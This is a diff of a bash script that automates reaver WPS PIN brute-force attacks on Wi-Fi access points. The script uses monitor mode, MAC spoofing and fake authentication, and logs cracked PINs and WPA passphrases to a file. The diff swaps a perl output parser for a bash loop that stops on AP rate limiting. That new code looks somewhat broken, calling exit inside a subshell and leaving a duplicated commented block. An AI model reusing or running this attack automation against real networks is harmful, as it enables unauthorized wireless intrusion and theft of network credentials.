@@ -540,53 +540,29 @@ stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
 
 SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'.session';
 BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
-BSSID_LIMIT_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'_limit';
-BSSID_LAST_PIN_DATE_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'_date';
-touch $CHECK_ACTIVITY_FILE && chmod 600 $CHECK_ACTIVITY_FILE;
 
 while true; do
 #	CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
 #	echo "$CMD_FAUTH" && eval $CMD_FAUTH >>/dev/null
-	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
-	echoWhite "$CMD_REAVER" && eval $CMD_REAVER \
-	| perl -lane '
-		if (/'$REAVER_CHECKED_PIN_PERL_REGEXP'/){
-			system("echo \$(date +%s) >> '$BSSID_LAST_PIN_DATE_FILE'");
-		}
-		if (/'$REAVER_ACTIVITY_PERL_REGEXP'/){
-			system("touch '$CHECK_ACTIVITY_FILE'");
-		}
-		elsif (/AP rate limiting/){
-			system("touch '$BSSID_LIMIT_FILE'");
-			system("killall -INT reaver");
-			print $_,"\n[+] Session saved";
-			exit 1;
-		}
-		elsif (/WPS PIN/){
-			open FILE, ">>'$CRACKED_LIST_FILE'";
-			print FILE "-----PIN----'$AP_BSSID' ('$AP_ESSID')-----------";
-			print FILE $_;
-			close FILE;
-			REAVER_GET_KEY=1;
-		}
-		elsif (/WPA PSK/){
-			open FILE, ">>'$CRACKED_LIST_FILE'";
-			print FILE "-----PASSPHRASE----'$AP_BSSID' ('AP_$ESSID')-----------";
-			print FILE $_;
-			close FILE;
-		}
-		print $_;
-	';
 
-	if [[ $REAVER_GET_KEY == 1 ]]; then
-		echoWhite "PIN Found......";
-		sleep 4;
-		break;
-	else
-		echoWhite "Failed to recover WPA key......";
-		sleep 4;
-		clear;
-	fi
+	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
+	echoWhite "$CMD_REAVER" && eval $CMD_REAVER | {
+		while IFS= read -r REAVER_OUTPUT; do
+			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "ap rate limiting") != 0 ]]; then
+				echoRed "$REAVER_OUTPUT";
+				echoRed "AP Rate Limiting Detected!!! Exiting......";
+				AP_RATE_LIMITING=1;
+				$(killall -INT reaver);
+				$(exit);
+			fi
+#			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "ap rate limiting") != 0 ]]; then
+#				echoRed "$REAVER_OUTPUT";
+#				echoRed "AP Rate Limiting Detected!!! Exiting......";
+#				AP_RATE_LIMITING=1;
+#				$(killall -INT reaver);
+#			fi
+		done
+	}
 
 	stopMonitor;
 	resetDeviceDriver;
